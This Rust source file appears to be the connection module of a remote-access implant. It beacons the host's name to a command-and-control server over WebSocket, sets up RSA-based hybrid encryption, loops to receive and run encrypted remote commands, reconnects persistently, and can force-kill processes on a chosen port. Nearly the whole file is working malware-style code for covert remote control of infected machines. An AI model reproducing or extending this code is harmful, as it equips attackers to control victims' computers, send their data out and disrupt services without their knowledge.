mod feature;
mod hybrid_crypto;

use std::time::Duration;

use feature::{find_feature_by_command, update::Update};
use futures_util::{
    stream::{SplitSink, SplitStream},
    SinkExt, StreamExt,
};
use gethostname::gethostname;
use hybrid_crypto::{encrypt_data_combined, generate_private_key, HybridDecryption};
use netstat2::AddressFamilyFlags;
use netstat2::{get_sockets_info, ProtocolFlags, ProtocolSocketInfo};
use rsa::{
    pkcs1::{DecodeRsaPublicKey, EncodeRsaPublicKey},
    Pkcs1v15Encrypt, RsaPrivateKey, RsaPublicKey,
};
use tokio::process::Command;
use tokio_tungstenite::{
    connect_async,
    tungstenite::{handshake::client::Response, Message},
    WebSocketStream,
};
pub struct Connector {
    //Server address sends data to main server
    address_server: String,
    write: Option<
        SplitSink<
            WebSocketStream<tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>>,
            Message,
        >,
    >,
    read: Option<
        SplitStream<WebSocketStream<tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>>>,
    >,
    public_key: Option<RsaPublicKey>,
    private_key: RsaPrivateKey,
}
impl Connector {
    pub fn new(address_server: String) -> Self {
        Connector {
            address_server,
            write: None,
            read: None,
            public_key: None,
            private_key: generate_private_key(),
        }
    }
    pub async fn send_message(&mut self, message: String) {
        match self
            .write
            .as_mut()
            .unwrap()
            .send(Message::Text(message.into()))
            .await
        {
            Ok(_) => {}
            Err(error) => {
                println!("Broken pipe or smth: {error}");
                Box::pin(self.search_for_c2()).await;
            }
        }
    }
    pub fn kill_process_on_port(&self, port: u16) {
        let af_flags = AddressFamilyFlags::IPV4 | AddressFamilyFlags::IPV6;
        let proto_flags = ProtocolFlags::TCP;

        if let Ok(sockets_info) = get_sockets_info(af_flags, proto_flags) {
            for si in sockets_info {
                if let ProtocolSocketInfo::Tcp(tcp_info) = si.protocol_socket_info {
                    if tcp_info.local_port == port {
                        println!(
                            "Found port {} in use by PID {}",
                            port, si.associated_pids[0]
                        );
                        let pid = si.associated_pids[0];
                        // Kill process (UNIX-style)
                        #[cfg(unix)]
                        {
                            let _ = Command::new("kill").arg("-9").arg(pid.to_string()).status();
                        }
                        // Windows version (taskkill)
                        #[cfg(windows)]
                        {
                            let _ = Command::new("taskkill")
                                .arg("/PID")
                                .arg(pid.to_string())
                                .arg("/F")
                                .status();
                        }
                    }
                }
            }
        } else {
            eprintln!("Failed to retrieve socket info");
        }
    }

    pub async fn search_for_c2(&mut self) {
        match connect_async(&self.address_server).await {
            Ok((ws_stream, _)) => {
                let (write, read) = ws_stream.split();
                self.write = Some(write);
                self.read = Some(read);
                println!("Connected to the server");
                self.send_message(format!("ping|{}", gethostname().into_string().unwrap()))
                    .await;
                if let Some(message) = self.read.as_mut().unwrap().next().await {
                    //Debug
                    //println!("{}", message.unwrap());
                    self.init_server(&message.unwrap().to_string()).await;
                }
                //when recieved a pong subscribe for updates
            }
            //make it keep trying
            Err(e) => {
                eprintln!("Failed to connect: {} the server is probably down", e);
                //wait for 6 min to try to connect again
                tokio::time::sleep(Duration::from_secs(5)).await;
                Box::pin(self.search_for_c2()).await;
            }
        }
    }
    pub async fn subscribe_to_updates(&mut self) {
        loop {
            let decrypted_message = self.accept_message().await;
            match find_feature_by_command(std::str::from_utf8(&decrypted_message).unwrap(), self)
                .await
            {
                Some(_) => break,
                None => {
                    self.send_hybrid_encryption(
                        self.public_key.clone().unwrap(),
                        "Couldnt recognise the command"
                            .to_string()
                            .as_bytes()
                            .to_vec(),
                    )
                    .await;
                }
            };
        }
    }

    pub async fn init_server(&mut self, message_str: &str) {
        if message_str == "pong" {
            let public_key_string = self
                .private_key
                .to_public_key()
                .to_pkcs1_pem(rsa::pkcs8::LineEnding::LF)
                .unwrap();

            self.write
                .as_mut()
                .unwrap()
                .send(Message::from(public_key_string))
                .await
                .unwrap();

            let decrypted_message = self.accept_message().await;
            self.public_key = Some(
                RsaPublicKey::from_pkcs1_pem(std::str::from_utf8(&decrypted_message).unwrap())
                    .unwrap(),
            );
            println!("rsa init sequence complete");

            self.subscribe_to_updates().await;
        }
    }
    pub async fn accept_message(&mut self) -> Vec<u8> {
        let mut hybrid_decryption_arguments: [Vec<u8>; 3] = [Vec::new(), Vec::new(), Vec::new()];
        for index in 0..3 {
            if let Some(message) = self.read.as_mut().unwrap().next().await {
                //cant put hex decode in the decrypt fn cuz it cant accept
                let unwraped_message = match message {
                    Ok(message) => message,
                    Err(error) => {
                        //Reconnect to the server if connection is reset
                        println!("Lost connection with server: {}", error);
                        //Box::pin(self.search_for_c2()).await;
                        return vec![];
                    }
                };
                hybrid_decryption_arguments[index] =
                    hex::decode(unwraped_message.to_string()).unwrap();
            }
        }
        let hybrid_decryption = HybridDecryption::new(
            hybrid_decryption_arguments[0].clone(),
            hybrid_decryption_arguments[1].clone(),
            hybrid_decryption_arguments[2].clone(),
        );
        hybrid_decryption.decrypt(self.private_key.clone())
    }
    pub async fn send_hybrid_encryption(&mut self, public_key: RsaPublicKey, data_to_enc: Vec<u8>) {
        let hybrid_encryption_result = encrypt_data_combined(public_key, data_to_enc);
        self.send_message(hybrid_encryption_result.get_encrypted_key())
            .await;
        self.send_message(hybrid_encryption_result.get_nonce())
            .await;
        self.send_message(hybrid_encryption_result.get_encrypted_data())
            .await;
    }
}
